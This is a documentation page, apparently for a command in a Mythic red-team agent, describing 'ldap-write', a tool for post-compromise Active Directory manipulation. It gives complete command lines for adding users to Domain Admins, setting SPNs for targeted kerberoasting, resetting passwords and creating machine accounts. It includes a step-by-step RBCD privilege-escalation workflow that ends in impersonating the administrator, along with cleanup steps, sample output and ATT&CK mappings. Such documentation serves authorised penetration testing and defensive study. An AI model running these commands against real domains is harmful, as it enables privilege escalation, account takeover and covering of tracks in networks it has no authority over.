+++
title = "ldap-write"
chapter = false
weight = 160
hidden = false
+++

## Summary

Modify Active Directory objects via LDAP. Add or remove group members, set or delete attributes, manage SPNs, enable/disable accounts, set passwords, create machine accounts (for RBCD attacks), and delete objects. Complements `ldap-query` by adding write capabilities for post-compromise AD manipulation.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | add-member | Operation to perform (see Actions below) |
| server | Yes | | Domain controller IP or hostname |
| target | Yes | | Object to modify (sAMAccountName, CN, or full DN) |
| group | Varies | | Group name for add-member/remove-member |
| attr | Varies | | Attribute name for set-attr/add-attr/remove-attr |
| value | Varies | | Attribute value for set-attr/add-attr/remove-attr/set-spn/set-password/add-computer |
| username | No | | LDAP bind username (UPN format: user@domain.local) |
| password | No | | LDAP bind password |
| base_dn | No | auto | LDAP search base (auto-detected from RootDSE) |
| port | No | 389 | LDAP port (636 for LDAPS) |
| use_tls | No | false | Use LDAPS (required for set-password) |

## Actions

| Action | Description | Required Args |
|--------|-------------|---------------|
| add-member | Add user/computer to a group | target, group |
| remove-member | Remove user/computer from a group | target, group |
| set-attr | Replace attribute value (or clear if empty) | target, attr, value |
| add-attr | Add a value to a multi-valued attribute | target, attr, value |
| remove-attr | Remove a specific value from an attribute | target, attr, value |
| set-spn | Add a servicePrincipalName (targeted kerberoasting) | target, value |
| disable | Disable an account (set ACCOUNTDISABLE in UAC) | target |
| enable | Enable a disabled account (clear ACCOUNTDISABLE) | target |
| set-password | Set account password (requires LDAPS) | target, value, use_tls |
| add-computer | Create a machine account (for RBCD attacks) | target, value |
| delete-object | Delete an AD object (cleanup after RBCD) | target |
| set-rbcd | Configure RBCD delegation (auto-builds security descriptor) | target, value |
| clear-rbcd | Remove RBCD delegation from an object | target |

## Usage

**Add user to Domain Admins:**
```
ldap-write -action add-member -server 192.168.1.1 -target jsmith -group "Domain Admins" -username admin@domain.local -password pass
```

**Remove user from group:**
```
ldap-write -action remove-member -server dc01 -target jsmith -group "Domain Admins" -username admin@domain.local -password pass
```

**Set SPN (make kerberoastable):**
```
ldap-write -action set-spn -server dc01 -target svc_sql -value "MSSQLSvc/srv01.domain.local" -username admin@domain.local -password pass
```

**Disable an account:**
```
ldap-write -action disable -server dc01 -target jsmith -username admin@domain.local -password pass
```

**Set password (requires LDAPS):**
```
ldap-write -action set-password -server dc01 -target jsmith -value "NewP@ssw0rd!" -username admin@domain.local -password pass -use_tls true -port 636
```

**Modify arbitrary attribute:**
```
ldap-write -action set-attr -server dc01 -target jsmith -attr description -value "Service account" -username admin@domain.local -password pass
```

**Create machine account (for RBCD):**
```
ldap-write -action add-computer -server dc01 -target FAKEPC01 -value "Password123!" -username user@domain.local -password pass
```

**Set RBCD delegation (auto-builds security descriptor):**
```
ldap-write -action set-rbcd -server dc01 -target victimserver -value FAKEPC01$ -username user@domain.local -password pass
```

**Clear RBCD delegation (cleanup):**
```
ldap-write -action clear-rbcd -server dc01 -target victimserver -username user@domain.local -password pass
```

**Delete an object (cleanup):**
```
ldap-write -action delete-object -server dc01 -target FAKEPC01$ -username admin@domain.local -password pass
```

## Example Output

**add-member:**
```
[*] LDAP Group Membership Modification (T1098)
[+] Added:  CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
[+] To:     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local
[+] Server: 192.168.100.52
```

**add-computer:**
```
[*] LDAP Computer Account Creation (T1136.002)
[+] DN:            CN=FAKEPC01,CN=Computers,DC=north,DC=sevenkingdoms,DC=local
[+] sAMAccountName: FAKEPC01$
[+] Password:      (set)
[+] UAC:           WORKSTATION_TRUST_ACCOUNT (0x1000)
[+] Server:        192.168.100.52

[!] Use with RBCD: ldap-write -action set-attr -target <victim> -attr msDS-AllowedToActOnBehalfOfOtherIdentity ...
[!] Then: ticket -action s4u -target <victim> -impersonate administrator
```

**set-spn:**
```
[*] LDAP SPN Modification (T1134)
[+] Target: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
[+] SPN:    HTTP/fawkes-test.north.sevenkingdoms.local
[+] Server: 192.168.100.52

[!] Account is now kerberoastable — use kerberoast to extract TGS hash.
```

## RBCD Attack Workflow

Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation technique:

1. **Create a machine account** (default domain users can create up to 10):
   ```
   ldap-write -action add-computer -server dc01 -target FAKEPC01 -value "Password123!" -username user@domain.local -password pass
   ```

2. **Set RBCD delegation** on the target (requires GenericWrite/GenericAll on target):
   ```
   ldap-write -action set-rbcd -server dc01 -target targetserver -value FAKEPC01$ -username user@domain.local -password pass
   ```

3. **Perform S4U** to get a service ticket as admin:
   ```
   ticket -action s4u -target targetserver -impersonate administrator
   ```

4. **Cleanup** — clear RBCD and delete the machine account:
   ```
   ldap-write -action clear-rbcd -server dc01 -target targetserver -username user@domain.local -password pass
   ldap-write -action delete-object -server dc01 -target FAKEPC01$ -username user@domain.local -password pass
   ```

## Operational Notes

- Uses `go-ldap/v3` for LDAP add/modify/delete operations
- Target objects are resolved from sAMAccountName to DN automatically
- UPN format (`user@domain.local`) recommended for authentication
- `set-password` requires LDAPS (encrypted connection) — AD rejects password changes over plain LDAP
- Password is encoded as UTF-16LE with surrounding quotes per AD's `unicodePwd` attribute format
- `add-computer` creates objects in the default CN=Computers container
- `add-computer` requires ms-DS-MachineAccountQuota > 0 (default: 10 for domain users)
- `set-rbcd` automatically resolves the delegated account's objectSid and builds the security descriptor — no external tools needed
- `delete-object` requires Delete permission on the target object
- All modifications generate Mythic artifacts for tracking
- Write operations require appropriate AD permissions (Domain Admin, delegated rights, or object owner)

## MITRE ATT&CK Mapping

- **T1098** — Account Manipulation
- **T1098.005** — Account Manipulation: Device Registration
- **T1134.001** — Access Token Manipulation: Token Impersonation/Theft
- **T1136.002** — Create Account: Domain Account
